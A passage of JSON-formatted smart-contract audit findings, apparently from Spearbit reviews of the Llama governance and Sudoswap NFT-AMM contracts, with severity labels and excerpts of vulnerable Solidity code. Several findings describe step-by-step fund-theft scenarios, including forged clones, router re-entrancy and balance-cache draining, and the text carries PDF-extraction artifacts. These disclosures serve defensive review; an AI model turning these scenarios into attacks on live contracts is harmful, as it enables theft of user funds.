re-enable it.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Signed messages may not be cancelled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Creating, approving, and disapproving actions may all be done by signing a message and having another account call the relevant *BySig function. Currently, there is no way for a signed message to be revoked without a successful *BySig function call containing the nonce of the message to be revoked.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "LlamaCore name open to squatting or impersonation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "When deploying a LlamaCore clone, the create2 salt is derived from the name. This means that no two may have the same name, and name squatting, or impersonation, may occur.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Expired policyholders are active until they are explicitly revoked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Each policyholder in Llama has an expiration timestamp. However, policyholder can still use the power of their role after the expiration has passed. The final revoke only happens after the public LlamaPolicy.revokeExpiredRole method is called. Anyone can call this method after the expiration timestamp is passed. For the Llama system to function effectively with role expiration, it is essential that external keepers vigilantly monitor the contract and promptly revoke expired roles. A final revoke exactly at the expiration can not be guaranteed.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Gas optimizations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Throughout the codebase we've identified gas improvements that were aggregated into one issue for a better management. RelativeStrategy.sol#L159  The if (disapprovalPolicySupply == 0) revert RoleHasZeroSupply(disapprovalRole); check and actionDisapprovalSupply[actionInfo.id] = disapprovalPolicySupply; can be wrapped in an if block in case disapprovals are enabled  The uint128 newNumberOfHolders; and uint128 newTotalQuantity; variables are obsolete as the up- dates on the currentRoleSupply can be done in the if branches. LlamaPolicy.sol#L380-L392  The exists check is redundant LlamaPolicy.sol#L252  The _validateActionInfoHash(action.infoHash, actionInfo); is redundant as it's already done in the getActionState LlamaCore.sol#L292 LlamaCore.sol#L280 LlamaCore.sol#L672  Finding the BOOTSTRAP_ROLE in the LlamaFactory._deploy could happen by expecting the role at a cer- tain position like position 0 instead of paying gas for an on-chain search operation to iterate the array. LlamaFactory.sol#L205  quantityDiff calculation guaranteed to not overflow as the ternary checks initialQuantity > quantity before subtracting.  Infeasible for numberOfHolders and totalQuantity to overflow. See also LlamaPolicy.sol#L422-L423  Infeasible for numberOfHolders to overflow.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Unused code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Various parts of the code is unused or unnecessary.  CallReverted and MissingAdmin in LlamaPolicy.sol#L27-L29  DisapprovalThresholdNotMet in RelativeStrategy.sol#L28  Unused errors in LlamaCore.sol InvalidCancelation, ProhibitedByActionGuard, ProhibitedByStrategy, ProhibitedByStrategy(bytes32 reason) and RoleHasZeroSupply(uint8 role)  /// - Action creators are not allowed to cast approvals or disapprovals on their own actions, The comment is inaccurate, this strategy, the creators have no restrictions on their actions. RelativeStrategy.sol#L19 17", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Duplicate storage reads and external calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "When creating, approving, disapproving, queuing, and executing actions, there are calls between the various contracts in the system. Due to the external calls, the compiler will not cache storage reads, meaning the gas cost of warm sloads is incurred multiple times. The same is true for view function calls between the contracts. A number of these calls are returning the same value multiple times in a transaction.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Consider clones-with-immutable-args", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The cloned contracts have immutable values that are written to storage on initialization due to proxies being used. Reading from storage costs extra gas but also puts some of the storage values at risk of being overwritten when making delegate calls.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "The domainSeperator may be cached", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The domainSeperator is computed for each use. Some gas may be saved by using caching and deferring to the cached value.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Prefer on-chain SVGs or IPFS links over server links for contractURI", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Llama uses on-chain SVG for LlamaPolicy.tokenURI. The same could be implemented for LlamaPolicy.contractURI as well. In general IPFS links or on-chain SVG for visual representations provide better properties than centralized server links.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Consider making the delegate-call scripts functions only callable by delegate-call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "An additional safety check could be added to scripts if a function should be only callable via a delegate-call.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Missing tests for SingleUseScript.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "There are no tests for SingleUseScript.sol in Llama.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Role not available to Guards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Use cases where Guards require knowing the creation or approval role for the action are not sup- ported. ActionInfo does reference the strategy, and the two implemented strategies do have public functions referencing the approvalRole, allowing for a workaround. However, this is not mandated by the ILlamaStrategy interface and is not guaranteed to be present in future strategies.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Global guards are not supported", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Other protocols use of guards applies them to the account (i.e. globally). In other words, if global guards existed and if there are some properties you know to apply to the entire LlamaCore instance a global guard could be applied. The current implementation allows granular control, but it also requires granular control with no ability to set global guards.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Consider using _disableInitializers in constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "OpenZeppelin added the _disableInitializers() in 4.6.0 which prevents initialization of the im- plementation contract and recommends its use.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Revoking and setting a role edge cases", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "This issue highlights a number of edge-case behaviors 1. Calling setRoleHolder passing in an account with balanceOf == 0, 0 quantity, and 0 expiration results in minting the NFT. 2. Revoking all policies through revokeExpiredRole leaves an address with no roles except for the ALL_- HOLDERS_ROLE and a balanceOf == 1. 3. Revoking may be conducted on policies the address does not have (building on the previous scenario):  Alice is given role 1 with expiry.  Expiry passes.  Anyone calls revokeExpiredRole.  Role is revoked but Alice still has balanceOf == 1.  LlamaCore later calls revokePolicy with roles array of [2].  A role Alice never had is revoked.  The NFT is burned.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Use built in string.concat", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The solidity version used has a built-in string.concat which can replace the instances of string(abi.encodePacked(...). The client notes there are no gas implications of this change while the change does offer semantic clarity.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Inconsistencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Throughout the codebase, we've encountered some inconsistencies that we decided to point out. for(uint256 i = 0... is not used everywhere e.g. AbsoluteStrategy.sol#L130  Sometimes, a returned value is not named. e.g. named return value function createAction( uint8 role, ILlamaStrategy strategy, address target, uint256 value, bytes calldata data, string memory description ) external returns (uint256 actionId) { unnamed return value function createActionBySig( uint8 role, ILlamaStrategy strategy, address target, uint256 value, bytes calldata data, address policyholder, uint8 v, bytes32 r, bytes32 s ) external returns (uint256) {  Missing NatSpec on various functions. e.g. LlamaPolicy.sol#L102  _uncheckedIncrement is not used everywhere.  Naming of modifiers In all contracts the onlyLlama modfiier only refers to the llamaCore. The only exception is LlamaPolicyMetadataParamRegistry which has the same name but refers to llamaCore and rootLlama but is called onlyLlama. See LlamaPolicyMetadataParamRegistry.sol#L16  Console.log debug output in RelativeStrategy console.log in RelativeStrategy See: RelativeStrat- egy.sol#L215  In GovernanceScript.sol both of SetRolePermission and SetRoleHolder mirror structs defined in the shared lib/Structs.sol file. Additionally, some contracts declare their own structs over inheriting all structs from lib/Structs.sol:  LlamaAccount  GovernanceScript  LlamaPolicy Recommend removing duplicate structs and, where relevant, continue making use of the shared Structs.sol for struct definitions.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Policyholders with large quantities may not both create and exercise their large quantity for the same action", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The AbsoluteStrategy removes the action creator from the set of policyholders who may approve / disapprove an action. This is a departure from how the RelativeStrategy handles action creators. Not permitting action creators to approve / disapprove is simple to reason about when each policyholder has a quantity of 1; creating can even be thought of an implicit approval and may be factored in when choosing a minApprovals value. However, in scenarios where a policyholder has a large quantity (in effect a large weight to their casted approval), creating an action means they forfeit the use of the vast majority of their quantity for that particular action.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "The roleBalanceCheckpoints can run out of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The roleBalanceCheckpoints function returns the Checkpoints history of a balance. This check will copy into memory the whole history which can end up in a out of gas error. This is an informational issue as this function was designed for off-chain usage and the caller can use eth_call with a higher gas limit.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "GovernanceScript.revokeExpiredRoles should be avoided in favor of calling LlamaPol- icy.revokeExpiredRole from EOA", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "GovernanceScript.revokeExpiredRoles is intended to be delagate called from LlamaCore. Given that LlamaPolicy.revokeExpiredRole is already public and without access controls, it will always be cheaper, and less complex, to call directly from an EOA or batching a multicall, again from an EOA.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "The InvalidActionState can be improved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Currently, the InvalidActionState includes the expected state as an argument, this is unnecessary as you can derive the state from the method call, would make more sense to take the current state instead of the expected state.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "_uncheckedIncrement function written in multiple contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Multiple contracts make use of an _uncheckedIncrementfunction and each duplicates the function definition. Similarly the slot0 function appears in both LlamaAccount and LlamaCore and _toUint64 appears in the two strategy contracts plus LlamaCore.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Clones with malicious extradata are also considered valid clones", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Spearbit discovered that the functions verifying if a contract is a pair do so by only checking the rst 54 bytes (i.e. the Proxy code). An attacker could deploy a contract that starts with the rst 54 bytes of proxy code but have a malicious payload, and these functions will still verify it as a legitimate clone. We have found this to be a critical issue based on the feasibility of a potential exploit. Consider the following scenario: 1. An attacker creates a malicious pair by making a copy of the source of cloneETHPair() supplying malicious values for factory, bondingCurve, nft and poolType using a valid template for the connected contract. 2. The attacker has a contract with valid proxy code, connected to a valid template, but the rest of the parameters are invalid. 3. The Pair is initialized via a copy of initialize() of LSSVMPair, which calls __Ownable_init() to set a malicious owner. 4 4. The malicious owner calls call(), with target equal to the router contract and the calldata for the function pairTransferERC20From(): // Owner is set by pair creator function call(address payable target, bytes calldata data) external onlyOwner { // Factory is malicious LSSVMPairFactoryLike _factory = factory(); // `callAllowed()` is malicious and returns true require(_factory.callAllowed(target), \"Target must be whitelisted\"); (bool result, ) = target.call{value: 0}(data); require(result, \"Call failed\"); ,! } 5. The check for onlyOwner and require pass, therefore pairTransferERC20From() is called with the malicious Pair as msg.sender. 6. The router checks if it is called from a valid pair via isPair(): function pairTransferERC20From(...) external { // Verify caller is a trusted pair contract // The malicious pair passed this test require(factory.isPair(msg.sender, variant), \"Not pair\"); ... token.safeTransferFrom(from, to, amount); } 7. Because the function isPair() only checks the rst 54 bytes (the runtime code including the implementation address), isPair() does not check for extra parameters factory, bondingCurve, nft or poolType: 5 function isPair(address potentialPair, PairVariant variant) ... { ... } else if (variant == PairVariant.ENUMERABLE_ETH) { return ,! LSSVMPairCloner.isETHPairClone(address(enumerableETHTemplate),potentialPair); } ... } function isETHPairClone(address implementation, address query) ... { ... // Compare expected bytecode with that of the queried contract let other := add(ptr, 0x40) extcodecopy(query, other, 0, 0x36) result := and( eq(mload(ptr), mload(other)), // Checks 32 + 22 = 54 bytes eq(mload(add(ptr, 0x16)), mload(add(other, 0x16))) ) } 8. Now the malicious pair is considered valid, the require statement in pair- TransferERC20From() has passed and tokens can be transferred to the attacker from anyone who has set an allowance for the router.", "labels": ["Spearbit", "Sudoswap", "Severity: Critical Risk"]}, {"title": "Factory Owner can steal user funds approved to the Router", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "A pair owner can make arbitrary calls to any contract that has been approved by the factory owner. The code in the factory intends to prevent 6 router contracts from being approved for calls because router contracts can have access to user funds. An example includes the pairTransferERC20From() function, that can be used to steal funds from any account which has given it approval. The router contracts can nevertheless be whitelisted by rst being removed as a router and then being whitelisted. This way anyone can deploy a pair and use the call function to steal user funds.", "labels": ["Spearbit", "Sudoswap", "Severity: High Risk"]}, {"title": "Missing check in the number of Received Tokens when tokens are transferred directly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Within the function _validateTokenInput() of LSSVMPairERC20, two methods exist to transfer tokens. In the rst method via router.pairTrans ferERC20From() a check is performed on the number of received tokens. In the second method no checks are done. Recent hacks (e.g. Qubit nance) have successfully exploited safeTransfer- From() functions which did not revert nor transfer tokens. Additionally, with malicious or re-balancing tokens the number of transferred tokens might be dif- ferent from the amount requested to be transferred. 7 function _validateTokenInput(...) ... { ... if (isRouter) { ... // Call router to transfer tokens from user uint256 beforeBalance = _token.balanceOf(_assetRecipient); router.pairTransferERC20From(...) // Verify token transfer (protect pair against malicious router) require( _token.balanceOf(_assetRecipient) - beforeBalance == ,! inputAmount, \"ERC20 not transferred in\"); } else { // Transfer tokens directly _token.safeTransferFrom(msg.sender, _assetRecipient, inputAmount); } }", "labels": ["Spearbit", "Sudoswap", "Severity: Medium Risk"]}, {"title": "Malicious assetRecipient could get an unfair amount of tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The function _swapNFTsForToken() of LSSVMRouter calls safe- TransferFrom(), which then calls ERC721Received of assetRecipient. A ma- licious assetRecipient could manipulate its NFT balance by buying additional NFTs via the Pair and sending or selling them back to the Pair, enabling the malicious actor to obtain an unfair amount of tokens via routerSwapNFTsForTo- ken(). 8 function _swapNFTsForToken(...) ... { ... swapList[i].pair.cacheAssetRecipientNFTBalance(); ... for (uint256 j = 0; j < swapList[i].nftIds.length; j++) { ,! ,! nft.safeTransferFrom(msg.sender,assetRecipient,swapList[i].nftIds[j]); // call to onERC721Received of assetRecipient } ... outputAmount += swapList[i].pair.routerSwapNFTsForToken(tokenRecipient); // checks the token balance of assetRecipient } ,! ,! }", "labels": ["Spearbit", "Sudoswap", "Severity: Medium Risk"]}, {"title": "Malicious Router can exploit cacheAssetRecipientNFTBalance to drain pair funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "A malicious router could be whitelisted by an inattentive or a ma- licious factory owner and drain pair funds in the following exploit scenario: 1. Call the cache function. Suppose that the current balance is 10, so it gets cached. 2. Sell 5 NFTs to the pair and get paid using swapNFTsForToken. Total bal- ance is now 15 but the cached balance is still 10. 3. Call routerSwapNFTsForToken. This function will compute total_balance 9 - cached_balance, assume 5 NFTs have been sent to it and pay the user. However, no new NFTs have been sent and it already paid for them in Step 2.", "labels": ["Spearbit", "Sudoswap", "Severity: Medium Risk"]}, {"title": "Malicious Router can steal NFTs via Re-Entrancy attack", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "If the factory owner approves a malicious _router, it is possible for the malicious router to call functions like swapTokenForAnyNFTs() and set is- Router to true. Once that function reaches router.pairTransferERC20From() in _validateTokenInput(), they can re-enter the pair from the router and call swapTokenForAnyNFTs() again. This second time the function reaches router.pairTransferERC20From(), al- lowing the malicious router to execute a token transfer so that the require of _validateTokenInput is satised when the context returns to the pair. When the context returns from the reentrant call back to the original call, the require of _validateTokenInput would still pass because the balance was cached be- fore the reentrant call. Therefore, an attacker will receive 2 NFTs by sending tokens only once.", "labels": ["Spearbit", "Sudoswap", "Severity: Medium Risk"]}, {"title": "getAllHeldIds() of LSSVMPairMissingEnumerable is vulnerable to a denial of service attack", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The contract LSSVMPairMissingEnumerable tries to compensate for NFT contracts that do not have ERC721Enumerable implemented. However, this cannot be done for everything as it is possible to use transferFrom() to send an NFT from the same collection to the Pair. In that case the callback on- ERC721Received() will not be triggered and the idSet administration of LSSVM- PairMissingEnumerable will not be updated. This means that nft().balanceO f(address(this)); can be different from the elements in idSet. Assuming an actor accidentally, or on purpose, uses transferFrom() to send additional NFTs to the Pair, getAllHeldIds() will fail as idSet.at(i) for unregistered NFTs will fail. This can be used in a grieng attack. getAllHeldIds() in LSSVMPairMissingEnumerable: function getAllHeldIds() external view override returns (uint256[] memory) { uint256 numNFTs = nft().balanceOf(address(this)); // returns the registered + unregistered NFTs uint256[] memory ids = new uint256[](numNFTs); for (uint256 i; i < numNFTs; i++) { ids[i] = idSet.at(i); // will fail at the unregistered NFTs } return ids; ,! } The following checks performed with _nft.balanceOf() might not be accurate in combination with LSSVMPairMissingEnumerable. Risk is low because any additional NFTs making later calls to _sendAnyNFTsToRecipient() and _send- SpecificNFTsToRecipient() will fail. However, this might make it more difcult to troubleshoot issues. 11 function swapTokenForAnyNFTs(...) .. { ,! ... require((numNFTs > 0) && (numNFTs <= _nft.balanceOf(address(this))),\"Ask for > 0 and <= balanceOf NFTs\"); ... _sendAnyNFTsToRecipient(_nft, nftRecipient, numNFTs); // could fail ... } function swapTokenForSpecificNFTs(...) ... { ... require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))),\"Must ask for > 0 and < balanceOf NFTs\"); // '<' should be '<=' ... _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds); // could fail ... ,! ,! } Note: The error string < balanceOf NFTs is not accurate.", "labels": ["Spearbit", "Sudoswap", "Severity: Medium Risk"]}, {"title": "With NFT pools the protocol fees end up in assetRecipient instead of _factory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Assume a scenario where an NFT pool with assetRecipient set have the received funds sent directly to the assetRecipient. Now, suppose a user executes the swapTokenForSpecificNFTs(). The function _validateTokenInput() sends the required input funds, including fees to the assetRecipient. The function _payProtocolFee() tries to send the fees to the _factory. However, this function attempts to do so from the pair con- tract. The pair contract does not have any funds because they have been sent directly to the assetRecipient. So following this action the payProtocolFee() lowers the fees to 0 and sends this number to the _factory while fees end up at assetRecipient' instead of at the _factory. The fees then end up at assetRecipient instead of at the _factory. Note:  The same issue occurs in swapTokenForAnyNFTs().  This issue occurs with both ETH and ERC20 NFT Pools, although their logic is slightly different.  This issue occurs both when swapTokenForSpecificNFTs() is called di- rectly as well as indirectly via the LSSVMRouter.  Although the pool fees are 0 with NFT pools, the factory fee is still present.  Luckily, TRADE pools cannot have an assetRecipient as this would also create issues. 13 abstract contract LSSVMPair is Ownable, ReentrancyGuard { ... function swapTokenForSpecificNFTs(...) external payable virtual returns (uint256 inputAmount) { ,! ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); // ,! sends inputAmount to assetRecipient _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds); _refundTokenToSender(inputAmount); _payProtocolFee(_factory, protocolFee); ... } } abstract contract LSSVMPairERC20 is LSSVMPair { ... function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override { ,! ... uint256 pairTokenBalance = _token.balanceOf(address(this)); if (protocolFee > pairTokenBalance) { protocolFee = pairTokenBalance; } _token.safeTransfer(address(_factory), protocolFee); // tries to send from the Pair contract } ,! } abstract contract LSSVMPairETH is LSSVMPair { function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override { ,! ... uint256 pairETHBalance = address(this).balance; if (protocolFee > pairETHBalance) { protocolFee = pairETHBalance; } payable(address(_factory)).safeTransferETH(protocolFee); // tries to send from the Pair contract } ,! }", "labels": ["Spearbit", "Sudoswap", "Severity: Medium Risk"]}, {"title": "Error codes of Quote functions are unchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The error return values from functions getBuyNFTQuote() and getSellNFTQuote() are not checked in contract LSSVMRouter.sol, whereas other functions in contract LSSVMPair.sol do check for error==CurveErrorCodes.Err or.OK. abstract contract LSSVMPair is Ownable, ReentrancyGuard { ,! ,! ,! ... function getBuyNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) { (error, ...) = bondingCurve().getBuyInfo(...); } function getSellNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) { (error, ...) = bondingCurve().getSellInfo(...); } function swapTokenForAnyNFTs(...) (uint256 inputAmount) { external payable virtual returns ... (error, ...) = _bondingCurve.getBuyInfo(...); require(error == CurveErrorCodes.Error.OK, \"Bonding curve error\"); ... } } LSSVMRouter.sol#L526 (, , pairOutput, ) = swapList[i].pair.getSellNFTQuote(...); The following contract lines contain the same code snippet below: LSSVMRoute r.sol#L360, LSSVMRouter.sol#L407, LSSVMRouter.sol#L450, LSSVMRouter.so l#L493, LSSVMRouter.sol#L627, LSSVMRouter.sol#L664 (, , pairCost, ) = swapList[i].pair.getBuyNFTQuote(...); Note: The current Curve contracts, which implement the getBuyNFTQuote() and getSellNFTQuote() functions, have a limited number of potential errors. However, future Curve contracts might add additional error codes.", "labels": ["Spearbit", "Sudoswap", "Severity: Medium Risk"]}, {"title": "Swaps can be front run by Pair Owner to extract any prot from slippage allowance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "If the user adds a nonzero slippage allowance, the pair owner can front run the swap to increase the fee/spot price and steal all of the slippage allowance. This basically makes sandwich attacks much easier and cheaper to execute for the pair owner.", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk"]}, {"title": "Add check for numItems == 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Functions getBuyInfo() and getSellInfo() in LinearCurve.sol check that numItems != 0. However, the same getBuyInfo() and getSellInfo() functions in ExponentialCurve.sol do not perform this check. 17 contract LinearCurve is ICurve, CurveErrorCodes { function getBuyInfo(...) ... { // We only calculate changes for buying 1 or more NFTs if (numItems == 0) { return (Error.INVALID_NUMITEMS, 0, 0, 0); } ... } function getSellInfo(...) ... { // We only calculate changes for selling 1 or more NFTs if (numItems == 0) { return (Error.INVALID_NUMITEMS, 0, 0, 0); } ... } } contract ExponentialCurve is ICurve, CurveErrorCodes { function getBuyInfo(...) ... { // No check on `numItems` uint256 deltaPowN = delta.fpow(numItems, FixedPointMathLib.WAD); ... } function getSellInfo(... ) ... { // No check on `numItems` uint256 invDelta = ,! FixedPointMathLib.WAD.fdiv(delta,FixedPointMathLib.WAD); ... } } If the code remains unchanged, an erroneous situation may not be caught and funds might be sent when selling 0 NFTs. Luckily, when numItems == 0 then result outputValue of the functions in Expo- nentialCurve is still 0, so there is no real issue. However, it is still important to x this because a derived version of these functions might be used by future developers.", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk"]}, {"title": "Disallow arbitrary function calls to LSSVMPairETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The contract LSSVMPairETH contains an open fallback() func- tion. The fallback() is most likely necessary because the proxy adds calldata and the receive() function, therefore not receiving the ETH. However, without additional checks any function call to an ETH Pair will succeed. This could result in unforseen scenarios which hackers could potentially exploit. fallback() external payable { emit TokenDeposited(msg.value); }", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk"]}, {"title": "Only transfer relevant funds for PoolType", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The functions _initializePairETH() and _initializePairERC20() allow for the transfer of ETH/ERC20 and NFTs even when this is not relevant for the PoolType. Although funds can be rescued from the Pair, it is perhaps better to prevent these types of mistakes. 19 function _initializePairETH(...) ... { ... // Transfer initial `ETH` to `pair` // Only relevant for `PoolType.TOKEN` or `PoolType.TRADE` payable(address(_pair)).safeTransferETH(msg.value); ... // Transfer initial `NFT`s from `sender` to `pair` for (uint256 i = 0; i < _initialNFTIDs.length; i++) { // Only relevant for PoolType.NFT or PoolType.TRADE _nft.safeTransferFrom(msg.sender,address(_pair),_initialNFTIDs[i]); } } function _initializePairERC20(...) ... { ... // Transfer initial tokens to pair // Only relevant for PoolType.TOKEN or PoolType.TRADE _token.safeTransferFrom(msg.sender,address(_pair),_initialTokenBalance); ... // Transfer initial NFTs from sender to pair for (uint256 i = 0; i < _initialNFTIDs.length; i++) { // Only relevant for PoolType.NFT or PoolType.TRADE _nft.safeTransferFrom(msg.sender,address(_pair),_initialNFTIDs[i]); } }", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk"]}, {"title": "Check for 0 parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Functions setCallAllowed() and setBondingCurveAllowed() do not check that target != 0 while the comparable function setRouterAllowed() does check for _router != 0. 20 function setCallAllowed(address payable target, bool isAllowed) external ,! onlyOwner { ... // No check on target callAllowed[target] = isAllowed; } function setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external ,! onlyOwner { ... // No check on bondingCurve bondingCurveAllowed[bondingCurve] = isAllowed; } function setRouterAllowed(LSSVMRouter _router, bool isAllowed) external onlyOwner { require(address(_router) != address(0), \"0 router address\"); ... routerAllowed[_router] = isAllowed; ,! }", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk"]}, {"title": "Potentially undetected underow In assembly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Functions factory(), bondingCurve(), nft(), poolType(), and token() have an assembly based calculation where the paramsLength is sub- tracted from calldatasize(). Assembly underow checks are disregarded and if too few parameters are supplied in calls to the functions in the LSSVMPair contract, this calculation may underow, resulting in the values for factory(), bondingCurve(), nft(), poolType(), and token() to be read from unexpected pieces of memory. This will be usually zeroed therefore execution will stop at some point. However, it is safer to prevent this from ever happening. 21 function factory() public pure returns (LSSVMPairFactoryLike _factory) { ... assembly {_factory := shr(0x60,calldataload(sub(calldatasize(), paramsLength)))} ,! } function bondingCurve() public pure returns (ICurve _bondingCurve) { ... assembly {_bondingCurve := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 20)))} ,! } function nft() public pure returns (IERC721 _nft) { ... assembly {_nft := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 40)))} ,! } function poolType() public pure returns (PoolType _poolType) { ... assembly {_poolType := shr(0xf8,calldataload(add(sub(calldatasize(), paramsLength), 60)))} ,! } function token() public pure returns (ERC20 _token) { ... assembly {_token := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 61)))} ,! }", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk"]}, {"title": "Check number of NFTs is not 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Functions swapNFTsForToken(), routerSwapNFTsForToken(), and getSellNFTQuote() in LSSVMPair.sol do not perform input verication on the number of NFTs. If _bondingCurve.getSellInfo() accidentally happens to re- turn a non-zero value, then an unfair amount of tokens will be given back to the caller. The current two versions of bondingCurve do return 0, but a future version might accidentally return non-zero. Note: 1. getSellInfo() is supposed to return an error when numNFTs == 0, but this does not always happen. This error code is not always checked. function swapNFTsForToken(uint256[] calldata nftIds, ...) external virtual ,! ,! returns (uint256 outputAmount) { ... // No check on `nftIds.length` (error, newSpotPrice, outputAmount, protocolFee) = nftIds.length,..); _bondingCurve.getSellInfo(..., ... } function routerSwapNFTsForToken(address payable tokenRecipient) ... { ,! ... uint256 numNFTs = _nft.balanceOf(getAssetRecipient()) - _assetRecipientNFTBalanceAtTransferStart; ... // No check that `numNFTs > 0` (error, newSpotPrice, outputAmount, protocolFee) = _bondingCurve.getSellInfo(..., numNFTs, ...); ,! } function getSellNFTQuote(uint256 numNFTs) ... { ... // No check that `numNFTs > 0` (error, newSpotPrice, outputAmount, protocolFee) = bondingCurve().getSellInfo(..., numNFTs,...); ... ,! } 2. For comparison, the function swapTokenForSpecificNFTs() does perform an entry check on the number of requested NFTs. 23 function 